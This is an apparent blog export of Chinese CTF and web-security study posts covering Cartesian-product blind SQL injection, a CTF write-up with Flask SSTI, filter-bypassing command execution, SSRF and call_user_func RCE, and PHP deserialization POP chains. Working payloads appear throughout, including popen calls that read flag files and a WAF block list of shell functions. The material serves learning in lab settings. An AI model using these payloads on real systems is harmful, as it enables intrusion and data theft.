<h2 id="preg-replace命令执行"><a href="#preg-replace命令执行" class="headerlink" title="preg_replace命令执行"></a>preg_replace命令执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace原型：</span><br><span class="line"></span><br><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br></pre></td></tr></table></figure>

<p>pattern: 要搜索的模式，可以是字符串或一个字符串数组。</p>
<p>replacement: 用于替换的字符串或字符串数组。</p>
<p>subject: 要搜索替换的目标字符串或字符串数组。</p>
<p>preg_replace函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。</p>
<p> <strong>&#x2F;e 修正符</strong>使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1>]]></content>
      <tags>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>笛卡尔积延时注入</title>
    <url>/2025/01/21/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="适用情况"><a href="#适用情况" class="headerlink" title="适用情况"></a>适用情况</h1><p>如果一个网站存在基于时间的盲注，而恰好sleep这类核心函数被过滤的话，我们便可以使用。</p>
<h1 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h1><p><strong>数学表示：</strong></p>
<ul>
<li>A &#x3D; {a1, a2, …, am}</li>
<li>B &#x3D; {b1, b2, …, bn}</li>
</ul>
<p>那么笛卡尔积为</p>
<ul>
<li>A×B &#x3D; {(a1, b1), (a1, b2), …, (a1, bn), (a2, b1), …, (am, bn)}</li>
</ul>
<p><strong>数据库中：</strong></p>
<p>若执行：</p>
<p><code>SELECT * FROM TableA, TableB;</code></p>
<p>TableA:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| id | name |</span><br><span class="line">|----|------|</span><br><span class="line">| 1  | Alice|</span><br><span class="line">| 2  | Bob  |</span><br></pre></td></tr></table></figure>

<p>TableB:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| id | age |</span><br><span class="line">|----|-----|</span><br><span class="line">| 1  | 25  |</span><br><span class="line">| 2  | 30  |</span><br></pre></td></tr></table></figure>

<p>执行 <code>SELECT * FROM TableA, TableB;</code> 后的结果将是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">| TableA.id | TableA.name | TableB.id | TableB.age |</span><br><span class="line">|-----------|-------------|-----------|------------|</span><br><span class="line">| 1         | Alice       | 1         | 25         |</span><br><span class="line">| 1         | Alice       | 2         | 30         |</span><br><span class="line">| 2         | Bob         | 1         | 25         |</span><br><span class="line">| 2         | Bob         | 2         | 30         |</span><br></pre></td></tr></table></figure>

<p>可以看到查询结果是两个表的笛卡尔积。</p>
<h1 id="利用笛卡尔积进行延时注入"><a href="#利用笛卡尔积进行延时注入" class="headerlink" title="利用笛卡尔积进行延时注入"></a>利用笛卡尔积进行延时注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果查询的表中含有大量数据，数据库进行计算时需要一段时间，进而产生延时的效果。我们便可以通过是否有延时来判断某个条件是否正确。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><code>select * from admin where id = 1 and (条件语句) and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</code><br>通过是否有延时效果产生来判断条件语句是否正确。</p>
<h1 id="自动化脚本编写"><a href="#自动化脚本编写" class="headerlink" title="自动化脚本编写"></a>自动化脚本编写</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>根据是否产生延时(可通过不同个查询结果的笛卡尔积来控制)来判断条件语句是否正确</p>
<h2 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h2><p>**time.time():**它返回自1970年1月1日00:00:00 (UTC) 至当前时间的秒数，这是一个浮点数。这个值通常被称为“Unix时间戳”。可用于计算延时时间。</p>
<p>**requests.get（url）:**requests.get 是 requests库中的一个函数，用于执行HTTP GET请求</p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>这里以sql-lib less5（虽然这题布尔盲注也能做：)   )为例</p>
<p><strong>爆库名长度</strong></p>
<p><img src="/../images/1737534128492.jpg" alt="1737534128492" loading="lazy"></p>
<p>为8</p>
<p><strong>爆库名</strong></p>
<p><img src="/../images/1737534277746.jpg" alt="1737534277746" loading="lazy"></p>
<p><strong>爆表名</strong></p>
<p><img src="/../images/1737534388694.jpg" alt="1737534388694" loading="lazy"></p>
<p>以此类推，只要改变条件语句便能得到想要的信息。</p>
]]></content>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>轩辕杯wp</title>
    <url>/2025/05/20/%E8%BD%A9%E8%BE%95%E6%9D%AFwp/</url>
    <content><![CDATA[<h1 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h1><p>根据题目名字我们可以知道这是flask模板注入。</p>
<p>直接尝试<code>&#123;&#123;1*2&#125;&#125;</code>，发现返回值确实是2，则可以确认。</p>
<p>然后我们就直接利用<code>&#123;&#123;().__class__&#125;&#125;</code>获取子类，发现<code>.</code>给过滤了，我们换成<code>&#123;&#123;()['__class__']&#125;&#125;</code>，发现可行。</p>
<p><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[133]['__init__']['__globals__']['popen']('whoami')['read']()&#125;&#125;</code></p>
<p>发现popen被过滤了可以改为</p>
<p><code>&#123;&#123;()['__class__']['__base__']['__subclasses__']()[133]['__init__']['__globals__']["po""pen"]('whoami')['read']()&#125;&#125;</code></p>
<p>绕过，后来发现<code>.</code>.以及<code>flag，cat</code>都被过滤了。直接16进制编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[133][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&quot;po&quot;&quot;pen&quot;](&#x27;\x63\x61\x74 \x2e\x2e/\x66\x6c\x61\x67&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><code>flag&#123;d688fabc-8243-4d02-95b0-0604f2d39eb0&#125;</code></p>
<h1 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h1><p>只有前端验证</p>
<p>控制台直接执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fetch(&#x27;getflag.php&#x27;, &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;,</span><br><span class="line">  body: &#x27;score=100000000000&#x27;</span><br><span class="line">&#125;)</span><br><span class="line">.then(r =&gt; r.text())</span><br><span class="line">.then(flag =&gt; alert(&quot;Flag: &quot; + flag));</span><br></pre></td></tr></table></figure>



<p><code>flag：flag&#123;1ea31017-2650-4778-9b69-7416ba38cf5b&#125;</code></p>
<h1 id="ezssrf"><a href="#ezssrf" class="headerlink" title="ezssrf"></a>ezssrf</h1><p>源码要求我们的host为空且只能是http协议，那就</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http:/127.0.0.1/flag</span><br></pre></td></tr></table></figure>

<p>http:&#x2F;127.0.0.1&#x2F;flag会被<code>curl_init（）</code>修正为http:&#x2F;127.0.0.1&#x2F;flag</p>
<p>得到flag在FFFFF11111AAAAAggggg.php</p>
<p>访问得到</p>
<p><code>flag&#123;d0b17239-df29-4217-9182-2ad29cc604b1&#125;</code></p>
<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><strong>第一关</strong></p>
<p>按提示url输入a&#x3D;welcome,提交new,cookie里的star值改为admin，得到&#x2F;l23evel4.php</p>
<p><strong>第二关</strong></p>
<p>直接password&#x3D;2025q,得到&#x2F;levelThree.php</p>
<p><strong>第三关</strong></p>
<p>看到代码里有&#x2F;xixi.txt，直接访问得到&#x2F;level444Four.php</p>
<p><strong>第四关</strong></p>
<p>用bp改HEAD方法，user-agent改identity&#x3D;n1c3得到&#x2F;level4545Five.php</p>
<p><strong>第五关</strong></p>
<p>把代码给ai，得到密钥**<code>W3lC0E_CtF</code>**，得到&#x2F;zzpufinish.ph</p>
<p><strong>第六关</strong></p>
<p>说会过滤，我们先用ls，目录遍历发现flag在前三层，然后用cat  ..&#x2F;..&#x2F;..&#x2F;flag,但是cat 和flag都被过滤了，直接**”ca””t” ..&#x2F;..&#x2F;..&#x2F;“fl””ag”**绕过得到</p>
<p><code>flag&#123;97bf5104-28ce-485a-93b7-592ff95a452b&#125;</code>           </p>
<h1 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h1><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;shell_exec&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;passthru&quot;</span>, <span class="string">&quot;proc_open&quot;</span>, <span class="string">&quot;show_source&quot;</span>, </span><br><span class="line">        <span class="string">&quot;phpinfo&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;dl&quot;</span>, <span class="string">&quot;proc_terminate&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;escapeshellcmd&quot;</span>, </span><br><span class="line">        <span class="string">&quot;escapeshellarg&quot;</span>, <span class="string">&quot;assert&quot;</span>, <span class="string">&quot;substr_replace&quot;</span>, <span class="string">&quot;call_user_func_array&quot;</span>, </span><br><span class="line">        <span class="string">&quot;call_user_func&quot;</span>, <span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_map&quot;</span>, </span><br><span class="line">        <span class="string">&quot;register_shutdown_function&quot;</span>, <span class="string">&quot;register_tick_function&quot;</span>, <span class="string">&quot;filter_var&quot;</span>, </span><br><span class="line">        <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>, <span class="string">&quot;array_walk&quot;</span>, </span><br><span class="line">        <span class="string">&quot;array_walk_recursive&quot;</span>, <span class="string">&quot;pcntl_exec&quot;</span>, <span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;fwrite&quot;</span>, </span><br><span class="line">        <span class="string">&quot;file_put_contents&quot;</span>, <span class="string">&quot;readfile&quot;</span>, <span class="string">&quot;file_get_contents&quot;</span>, <span class="string">&quot;highlight_file&quot;</span>, <span class="string">&quot;eval&quot;</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$disable_fun</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$disable_fun</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$a</span>, <span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;宝宝这对嘛,这不对噢&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="variable">$new</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new&#x27;</span>];</span><br><span class="line"><span class="variable">$star</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$num</span>) &amp;&amp; <span class="variable">$num</span> != <span class="number">1234</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;看来第一层对你来说是小case&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) &amp;&amp; <span class="variable">$num</span> &gt; <span class="number">1234</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;还是有点实力的嘛&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$new</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$star</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;看起来你遇到难关了哈哈&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$b</span> = <span class="title function_ invoke__">waf</span>(<span class="variable">$new</span>); </span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$b</span>) &#123; </span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$star</span>); </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;恭喜你，又成长了&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>num&#x3D;1235</p>
<p>我们主要关注<code>call_user_func($b, $star);</code></p>
<p>有两种解法：</p>
<p><strong>方法1</strong>:</p>
<p>new&#x3D;readgzfile;star&#x3D;&#x2F;flag。</p>
<p><strong>方法2</strong></p>
<p>new&#x3D;&#x2F;system;star&#x3D;cat ..&#x2F;..&#x2F;..&#x2F;flag。</p>
]]></content>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机的搭建</title>
    <url>/2024/08/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>虚拟机搭建<br>  1.首先安装vmware（<a href="https://support.broadcom.com/group/ecx/downloads%EF%BC%89%EF%BC%88%E8%A6%81%E6%B3%A8%E5%86%8C%EF%BC%89%E9%80%89%E6%8B%A9VMware">https://support.broadcom.com/group/ecx/downloads）（要注册）选择VMware</a> workstation pro 17下载<br>  2.再下载Ubuntu22.04（<a href="https://cn.ubuntu.com/download%EF%BC%89">https://cn.ubuntu.com/download）</a><br>  3.在VMware中搭建虚拟机参考（<a href="https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1%EF%BC%89">https://www.bilibili.com/video/BV1pX4y1k7u1/?spm_id_from=333.337.search-card.all.click&amp;vd_source=e0ae5bd7dc2c8b75c8ea1bcf435b83f1）</a><br>  4.进入虚拟机完成Ubuntu的安装。</p>
]]></content>
  </entry>
  <entry>
    <title>攻防世界</title>
    <url>/2024/12/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
    <content><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><p><strong>概念：</strong></p>
<p>PHP序列化（函数为<code>serialize</code>）是一种将复杂数据结构（如对象和数组）转换成字符串的过程，以便于存储或传递数据，但仅保留对象里的成员变量，不保留函数方法。</p>
<p>举例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;张三&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">    <span class="string">&#x27;is_employee&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>使用 <code>serialize()</code> 函数序列化这个数组后长这样。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">30</span>;s:<span class="number">10</span>:<span class="string">&quot;is_employee&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>PHP反序列化标识符含义：</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">a - array</span><br><span class="line">b - <span class="type">boolean</span></span><br><span class="line">d - <span class="type">double</span></span><br><span class="line">i - <span class="type">integer</span></span><br><span class="line">o - common <span class="type">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="type">string</span></span><br><span class="line">C - <span class="keyword">custom</span> <span class="type">object</span></span><br><span class="line">O - <span class="keyword">class</span></span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - <span class="keyword">unicode</span> <span class="type">string</span></span><br></pre></td></tr></table></figure>

<p>反序列化（函数为<code>unserilize</code>）可以将序列化生成的字符串重新还原为对象中的成员属性。</p>
<p><strong>原理：</strong></p>
<p>反序列化漏洞的成因在于代码中的 unserialize() 接收的参数是可控的，函数的参数可以是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改来使得一些魔术方法被调用进而实现最终的攻击。</p>
<p>以下是漏洞中可能遇到的魔法方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():具有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__toString</span>()方法用于一个类被当成字符串时应怎样回应。例如<span class="keyword">echo</span> <span class="variable">$obj</span>;应该显示些什么。</span><br><span class="line"></span><br><span class="line">此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()方法在一个对象被序列化之前调用；</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="title function_ invoke__">unserialize</span>( )会检查是否存在一个<span class="title function_ invoke__">_wakeup</span>( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure>

<p><em>例题</em></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class w44m</span><br><span class="line">&#123;</span><br><span class="line">    private $admin = &#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd = &#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class w22m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line">class w33m</span><br><span class="line">&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m=&quot;Getflag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new w22m();</span><br><span class="line">$b=new w33m();</span><br><span class="line">$c=new w44m();</span><br><span class="line">$b-&gt;w00m=$c;</span><br><span class="line">$a-&gt;w00m=$b;</span><br><span class="line"></span><br><span class="line">$payload=serialize($a);</span><br><span class="line">echo &quot;?w00m=&quot;.urlencode($payload);  //存在private和protected属性要url编码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//输出为：</span><br><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m</span><br><span class="line">%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%</span><br><span class="line">3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00ad</span><br><span class="line">min%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00pas</span><br><span class="line">swd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%</span><br><span class="line">3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><strong>绕过：</strong></p>
<h4 id="1-wakeup-方法漏洞："><a href="#1-wakeup-方法漏洞：" class="headerlink" title="1.__wakeup()方法漏洞："></a>1.__wakeup()方法漏洞：</h4>]]></content>
      <tags>
        <tag>攻防世界</tag>
      </tags>
  </entry>
</search>
